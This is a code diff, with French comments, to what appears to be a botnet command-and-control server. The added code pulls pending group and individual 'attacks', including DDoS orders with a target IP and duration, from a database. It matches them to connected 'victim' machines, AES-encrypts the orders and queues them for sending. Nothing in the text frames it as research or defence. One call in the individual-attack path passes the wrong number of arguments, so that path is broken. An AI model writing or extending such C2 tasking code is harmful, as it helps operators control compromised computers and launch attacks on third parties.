@@ -111,6 +111,23 @@ def get_group_of(id = None, uid = None):
         return None
     else:
         return groups
+    
+
+
+
+def format_attack_data(type, id, data):
+
+    json_data = json.loads('{"action":"' + type + '", "id":"' + str(id) + '"}')
+
+    json_data.update(data)
+
+    print("json_data = " + str(json_data))
+
+    return json_data
+    
+    
+
+
 
 
 # Fin fonctions
@@ -235,7 +252,7 @@ if args.ddos:
                 values = (id[0], 
                           "ddos", 
                           "pending", 
-                          "{\"address\": \"" + args.address + "\", \"time\": \"" + str(args.time) + "\"}")
+                          "{\"ip\": \"" + args.address + "\", \"time\": \"" + str(args.time) + "\"}")
 
                 mycursor.execute(query, values)
 
@@ -745,8 +762,8 @@ elif args.start:
     else:
         print("démarrage du serveur sur le port " + str(args.port))
 
-
-        #(addr, conn, thread_emission, emission_queue, thread_reception, reception_queue, sym_key, iv)
+        #  0      1          2                3               4                 5            6      7   8
+        #(addr, conn, thread_emission, emission_queue, thread_reception, reception_queue, sym_key, iv, uid)
         clients = []
 
         # Socket
@@ -778,7 +795,7 @@ elif args.start:
 
 
         while running:
-            # print("running")
+            print("running")
             # print(connection_list)
 
             read_sockets, write_sockets, error_sockets = select.select(connection_list, [], connection_list, 3.0)
@@ -805,7 +822,6 @@ elif args.start:
 
                     # Récupération de la clé publique du client
                     public_key = rsa.PublicKey.load_pkcs1_openssl_pem(reception_queue.get())
-                    # print("public key : " + str(public_key))
 
                     # Génération de la clé symétrique
                     sym_key = get_random_bytes(16)
@@ -827,7 +843,6 @@ elif args.start:
 
                     cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
                     pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
-                    # print("received data : " + str(pt))
 
                     # Récupération de l'uid client
                     uid = json.loads(pt)["uid"]
@@ -859,27 +874,124 @@ elif args.start:
                     db.commit()
 
                     # Ajout du client à la liste des clients
-                    clients.append(dict(uid = uid, 
-                                        addr = addr, 
+                    clients.append(dict(addr = addr, 
                                         conn = conn, 
                                         thread_emission = thread_emission, 
                                         emission_queue = emission_queue, 
                                         thread_reception = thread_reception, 
                                         reception_queue = reception_queue, 
                                         sym_key = sym_key, 
-                                        iv = iv
+                                        iv = iv,
+                                        uid = uid
                                     ))
 
 
             
-            for client in clients:
-                # Récupération des attaques de groupe à lancer
-            
+            # Récupération des attaques de groupe à lancer
+            # state = "pending", "running", "finished", "error"
+            query = "SELECT * FROM group_attacks WHERE state = 'pending';"
 
-                # Récupération des attaques individuelles à lancer
+            mycursor.execute(query)
+
+            attacks = mycursor.fetchall()
+
+            print("ATT : " + str(attacks))
+
+
+            for attack in attacks:
+
+                # Récupération des données de l'attaque
+                attack_data = json.loads(attack[4])
+                attack_type = attack[2]
+                attack_id = attack[0]
+
+
+                # Récupération des ordinateurs du groupe
+                query = "SELECT uid FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = %s)"
+                values = (attack[1], )
+
+                mycursor.execute(query, values)
+                victims_uid = mycursor.fetchall()
+
+
+                attack_sent = False
+
+                for victim_uid in victims_uid:
+                    for client in clients:
+                        if client['uid'] == victim_uid[0]:
+                            print("sending attack to " + str(client['addr']))
+                            attack_sent = True
+
+                            data_to_send = format_attack_data(attack_type, attack_id, attack_data)
+
+                            # Envoi de l'attaque à l'ordinateur
+                            cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
+                            cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
+                            print("cipher_text : ")
+                            print(cipher_text)
+                            
+                            decimal_elements = [byte for byte in cipher_text]
+                            print("decimal_elements : " + str(decimal_elements))
+
+                            client['emission_queue'].put(cipher_text)
+
+                # Mise à jour de l'attaque si elle a été envoyée au moins une fois
+                if attack_sent:
+                    query = "UPDATE group_attacks SET state = 'running' WHERE id = %s"
+                    values = (attack[0], )
+
+                    mycursor.execute(query, values)
+        
+
+
+            # Récupération des attaques individuelles à lancer
+            # state = "pending", "running", "finished", "error"
+            query = "SELECT * FROM victim_attacks WHERE state = 'pending';"
+
+            mycursor.execute(query)
+
+            attacks = mycursor.fetchall()
+
+            for attack in attacks:
+
+                # Récupération des données de l'attaque
+                data = json.loads(attack[4])
+
+
+                # Récupération des ordinateurs du groupe
+                query = "SELECT uid FROM victims WHERE id = %s"
+                values = (attack[1], )
+
+                mycursor.execute(query, values)
+
+                victims = mycursor.fetchall()
+
+                for victim in victims:
+                    
+                    victim_uid = victim[0]
+
+                    for client in clients:
+                        if client['uid'] == victim_uid:
+                            print("sending attack to " + str(client['addr']))
+
+                            data_to_send = format_attack_data(data)
+
+                            # Envoi de l'attaque à l'ordinateur
+                            cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
+                            cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
+
+                            client['emission_queue'].put(cipher_text)
+
+                # Mise à jour de l'attaque
+                query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
+                values = (attack[0], )
+
+                mycursor.execute(query, values)
+                
+            #######################
                 
                     
-
+            for client in clients:
 
                 # Récupération des données clients
                 try:
